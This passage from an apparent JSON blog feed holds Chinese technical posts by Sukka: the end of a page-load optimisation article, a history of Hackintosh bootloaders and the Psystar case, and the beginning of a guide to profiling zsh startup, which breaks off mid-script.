Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span 